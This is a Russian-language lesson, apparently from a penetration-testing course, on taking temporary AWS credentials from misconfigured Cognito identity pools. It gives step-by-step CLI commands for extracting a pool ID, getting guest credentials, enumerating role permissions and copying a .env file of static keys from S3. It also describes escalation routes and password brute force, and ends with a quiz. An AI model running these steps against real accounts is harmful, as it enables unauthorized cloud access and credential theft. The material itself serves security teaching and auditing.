---
id: cloud-aws-cognito
title: "Cognito: user pool, identity pool и кража временных кредов"
category: cloud
parent: cloud-aws-deep
difficulty: hard
order: 2
tags: [cloud, aws, cognito, identity-pool, user-pool, sts, credentials]
prerequisites: [cloud-aws-deep, cloud-iam-basics]
useful_for:
  - "Получение первых AWS-креденшелов без аутентификации"
  - "Пентест мобильных и SPA-приложений на AWS"
  - "Bug bounty: Cognito misconfig"
estimated_minutes: 50
summary: "Как устроены Cognito user pool и identity pool, чем опасен неаутентифицированный guest-доступ и как из публичного identity pool получить временные AWS-креды и роль."
---

## Задача

**Amazon Cognito** — сервис идентичности AWS для мобильных и веб-приложений. Он почти всегда стоит рядом с **identity pool**, который выдаёт временные AWS-креды. Если identity pool разрешает **guest-доступ**, то любой, кто знает его идентификатор, получает `AWS_ACCESS_KEY_ID` и `AWS_SECRET_ACCESS_KEY` — **без логина и пароля**.

Цель урока: из веб-приложения достать идентификатор identity pool и получить первые AWS-креды.

## Данные, с которыми работаем

Разберём две независимые части Cognito:
- **User pool** — хранилище пользователей (логин/пароль). Выдаёт **JWT** (ID/access/refresh токены). Сам по себе AWS-прав не даёт.
- **Identity pool** — обменивает идентичность на **временные AWS-креды** через `sts:AssumeRoleWithWebIdentity`. Принимает JWT из user pool, токены внешних IdP (Google/Apple) **или неаутентифицированную** идентичность (guest).

Наша цель — identity pool. Его идентификатор выглядит так: `us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`. Ищем его в JS-бандле SPA:

```bash
$ curl -s https://app.example.com/static/js/main.js | grep -Eo '[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}' | sort -u
us-east-1:12345678-1234-1234-1234-1234567890ab
```

## Шаг 1: получаем identity id

Первая операция — `get-id`. Если guest выключен, вернётся `NotAuthorizedException`; если включён — `IdentityId`:

```bash
$ aws cognito-identity get-id \
    --identity-pool-id "us-east-1:12345678-1234-1234-1234-1234567890ab" \
    --region us-east-1
{"IdentityId": "us-east-1:9f8e7d6c-5b4a-3210-fedc-ba9876543210"}
```

Guest-доступ включён. Обрати внимание: регион обязателен и должен совпадать с регионом пула, иначе `ResourceNotFoundException`.

## Шаг 2: обмениваем identity id на креды

```bash
$ aws cognito-identity get-credentials-for-identity \
    --identity-id "us-east-1:9f8e7d6c-5b4a-3210-fedc-ba9876543210" \
    --region us-east-1
{
  "Credentials": {
    "AccessKeyId": "ASIA...",
    "SecretKey": "...",
    "SessionToken": "...",
    "Expiration": "2026-10-12T14:00:00Z"
  }
}
```

У нас тройка временных кредов. Экспортируем их и смотрим, кто мы:

```bash
$ export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
$ aws sts get-caller-identity
{
    "Arn": "arn:aws:sts::123456789012:assumed-role/Cognito_AppUnauth_Role/CognitoIdentityCredentials"
}
```

Мы — **assumed-role `Cognito_AppUnauth_Role`** в чужом аккаунте. Креды временные (обычно на час) и выдаются от имени **unauthenticated role** — роли, которую админ назначил гостям.

## Шаг 3: разведка прав роли

Не перебираем API вслепую — используем `enumerate-iam`:

```bash
$ python3 enumerate-iam.py --access-key ASIA... --secret-key ... --session-token ...
[+] list_buckets - allowed
[+] get_object - allowed
[+] describe_instances - denied
```

Роль умеет читать S3. Смотрим, что там:

```bash
$ aws s3 ls
2024-03-01 12:00:00 target-configs
$ aws s3 cp s3://target-configs/prod.env - | head -5
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=wJalr...
```

Частая цепочка: unauth-роль читает S3, где лежит `.env` со **статическими** ключами сервисного пользователя. А у того уже больше прав — вплоть до `iam:CreatePolicyVersion`, то есть полной эскалации.

## Полный прогон от начала до конца

1. Извлекли `IdentityPoolId` из JS-бандла.
2. `get-id` → получили `IdentityId` (guest включён).
3. `get-credentials-for-identity` → временные AWS-креды.
4. `get-caller-identity` → роль `Cognito_AppUnauth_Role`.
5. `enumerate-iam` → чтение S3; нашли `.env` со статическими ключами.

## Если guest выключен: user pool и регистрация

Если `AllowUnauthenticatedIdentities=false`, прямой guest-доступ не пройдёт. Но у **user pool** может быть включена **самостоятельная регистрация**. Тогда путь такой: зарегистрировать своего пользователя (`SignUp`) → войти → получить ID token → обменять его через identity pool на креды **authenticated-роли** — которая обычно шире гостевой. Это не требует ни одного чужого пароля.

Проверяем клиент user pool:

```bash
$ aws cognito-idp describe-user-pool-client --user-pool-id us-east-1_ABC --client-id 1a2b3c
{"UserPoolClient": {"ClientName": "web", "GenerateSecret": false, ...}}
```

`GenerateSecret: false` — клиент без секрета, значит, `InitiateAuth`/`SignUp` можно вызывать из публичного кода. Если self-registration включена, регистрируемся и получаем токен.

## Если не сработало: обходы и тонкости

- **Guest → authenticated escalation.** Если в trust policy роли нет условия на **`amr`** (способ аутентификации), guest-токен может получить authenticated-роль. Отсутствие `ForAnyValue:StringLike cognito-identity.amazonaws.com:amr` — красный флаг.
- **Refresh token abuse.** Утёкший refresh token user pool позволяет бесконечно обновлять access/ID token и обменивать их на креды.
- **Developer provider.** `GetOpenIdTokenForDeveloperIdentity` выпускает токены по произвольному `LoginToken` — при слабом условии доверия это прямой вход.
- **Weak password policy.** User pool без политики сложности → перебор через `InitiateAuth` (это онлайн-перебор, ограничивай набор дефолтами).
- **Attribute injection.** Пользовательские атрибуты, попадающие в IAM-условия, можно подделать, если они writable.

## Частые ошибки и подводные камни

- **Путать user pool и identity pool.** JWT из user pool сам по себе AWS-прав не даёт; нужен обмен через identity pool.
- **Забывать про регион.** `get-id` и `get-credentials-for-identity` должны идти в регион пула.
- **Считать guest-доступ безобидным.** «Unauth-роль только для чтения» часто читает весь S3-бакет компании.
- **Игнорировать срок жизни кредов.** Временные креды истекают примерно за час — их надо обновлять.
- **Перебирать API вслепую.** `enumerate-iam` быстрее и тише, чем десятки пробных вызовов.
- **Не проверять `get-caller-identity`.** Без него легко перепутать роль и записать неверную находку.

- **Не проверять `AllowUnauthenticatedIdentities` явно.** Наличие `IdentityPoolId` ещё не значит, что guest включён — без проверки вы получите `NotAuthorizedException`.

- **Не проверять self-registration.** Включённая регистрация в user pool даёт путь к authenticated-роли без чужих паролей.

## Что мы теперь знаем

- User pool выдаёт JWT; identity pool обменивает идентичность на **временные AWS-креды**.
- `AllowUnauthenticatedIdentities: true` = guest-доступ: креды без логина.
- `get-id` + `get-credentials-for-identity` дают тройку ключей за две команды.
- `get-caller-identity` показывает assumed-роль (`Cognito_...Unauth_Role`).
- Креды временные (~1 час) — их надо периодически обновлять.
- Self-registration в user pool даёт путь к authenticated-роли без чужих паролей.

## На что смотреть дальше

- **aws-ssm**: Session Manager как путь внутрь без открытых портов.
- **cloud-privesc-iam**: что делать с ролью, полученной из Cognito.
- **cloud-assume-role**: цепочки `sts:AssumeRole` к более широким ролям.

## Квиз

Проверь себя.

```quiz
- question: "Что выдаёт identity pool атакующему при включённом guest-доступе?"
  options:
    - "Временные AWS-креды через STS"
    - "Пароль администратора"
    - "Root-доступ к аккаунту"
    - "Ключ шифрования KMS"
  answer: 0
  explanation: "Identity pool обменивает идентичность (в том числе неаутентифицированную) на временные креды AssumeRoleWithWebIdentity."
- question: "Как отличить user pool от identity pool по эффекту?"
  options:
    - "User pool выдаёт JWT, identity pool — временные AWS-креды"
    - "User pool выдаёт креды, identity pool — JWT"
    - "Оба выдают только cookies"
    - "Оба выдают root-доступ"
  answer: 0
  explanation: "User pool — про аутентификацию пользователей (JWT); identity pool — про обмен на AWS-креды."
- question: "Какой самый частый способ использовать Cognito для входа в AWS?"
  options:
    - "Включённый AllowUnauthenticatedIdentities"
    - "Отключённый CloudTrail"
    - "Публичный S3-бакет"
    - "Открытый порт 22"
  answer: 0
  explanation: "Guest-доступ позволяет получить креды без логина."
- question: "Что нужно проверить в trust policy роли identity pool, чтобы не допустить guest→authenticated?"
  options:
    - "Условие на amr (способ аутентификации)"
    - "Только регион"
    - "Только имя роли"
    - "Только тег"
  answer: 0
  explanation: "Без условия amr guest-токен может получить authenticated-роль."
- question: "Почему клиент user pool с GenerateSecret: false важен?"
  options:
    - "Он позволяет вызывать InitiateAuth и SignUp из публичного кода"
    - "Он хранит пароль в открытом виде"
    - "Он отключает MFA"
    - "Он даёт root-доступ"
  answer: 0
  explanation: "Клиент без секрета пригоден для использования в браузере и мобильном приложении."
```

## Куда дальше

В следующем уроке мы разберём **SSM** — Run Command, Parameter Store и Session Manager, — и покажем, как получить shell без единого открытого порта. А пока главное запомни: **Cognito часто открывает дверь в аккаунт**, и одна включённая галочка `AllowUnauthenticatedIdentities` даёт креды кому угодно.

## Где пригодится

- **Пентест AWS:** получение первых кредов из мобильного/веб-приложения.
- **Bug bounty:** Cognito-мисконфиги — частый класс находок.
- **Red team:** входной билет в аккаунт без фишинга.
- **Blue team:** аудит identity pools и прав ролей.
